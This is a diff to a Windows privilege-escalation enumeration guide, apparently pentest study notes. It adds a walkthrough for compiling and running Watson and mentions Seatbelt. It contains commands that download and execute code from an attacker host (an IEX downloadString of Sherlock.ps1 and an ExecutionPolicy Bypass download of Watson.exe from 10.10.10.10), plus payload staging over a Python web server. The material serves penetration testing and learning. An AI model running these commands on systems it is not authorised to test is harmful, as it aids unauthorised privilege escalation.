@@ -187,6 +187,7 @@ We are also going to look a a few automated methods of performing Windows Enumer
 * Sherlock
 * Watson
 * JAWZ
+* Seatbelt
 
 ### Running Windows Privesc Check (windows-privesc-check)
 The Windows Privesc Check is a very powerful tool for finding common misconfigurations in a Windows system that could lead to privledge escalation.  It has not been updated for a while, but it is still as effective today as it was 5 years ago. The downside of this script is that it was written in Python and if the target system does not have Python installed, you will need to use an executable version that has a Python interpreter built in.  Having to include Python in the package makes the executable version is pretty large, coming in at a whopping 7.14 MB!!
@@ -247,6 +248,41 @@ CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfi
 Or from a Windows Powershell:
 ```powershell
 PS C:\> IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/Sherlock.ps1')
+```
+
+### Running Watson
+Sherlock has been superceded by a .net Windows enumeration platform called Watson which is frequently updated by the author.
+It is a bit tricker to deploy and use as you need to compile it yourself and match the version of .net with the target system's version.
+
+First, on the target system we will need to check the versions of .Net that have been installed by navigating to the .net framework folder and poking around:
+```
+cd\Windows\Microsoft.NET\Framework\
+dir /s msbuild
+```
+Only active versions of .NET will have the msbuild.exe.
+Make note of the available versions and leverage that to compile your version of Watson that targets the remote Windows machine.
+Download the latest version of Watson from github:
+```
+git clone https://github.com/rasta-mouse/Watson.git
+```
+And open it using Visual Studio.  In the Solution Explorer, click the Properties and modify the "Target Framework:" value to align with the remote Windows machine's version of the .Net framework. It will prompt you to reopen the project. Once the project has reloaded, Build the project under the Release mode (CTRL + SHIFT + B).  
+
+Next we will copy our Watson.exe to our Kali instance and setup a simple python HTTP webserver in Kali to host the file which the remote Windows box can download it from:  
+```bash
+root@kali:~/tools# cd Watson/
+root@kali:~/tools/Watson# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+```
+Now we will need to transfer the compiled Watson.exe file to our remote windows box:
+```
+CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/Watson.exe\", \"C:\\Users\\Public\\Downloads\\Watson.exe\");
+```
+And now we run the executeable on the remote machine. I like run with all the audit enabled like so:
+```
+C:\Users\Admin>cd ..
+C:\Users>cd Public
+C:\Users\Public>cd Downloads
+C:\Users\Public\Downloads>Watson.exe
 ```
 
 ### Running JAWS - Just Another Windows (Enum) Script
@@ -480,7 +516,8 @@ https://gist.github.com/egre55
 https://github.com/egre55/ultimate-file-transfer-list
 https://lolbas-project.github.io/
 https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
-
+https://github.com/GhostPack/Seatbelt
+https://github.com/rasta-mouse/Watson
 
 
 
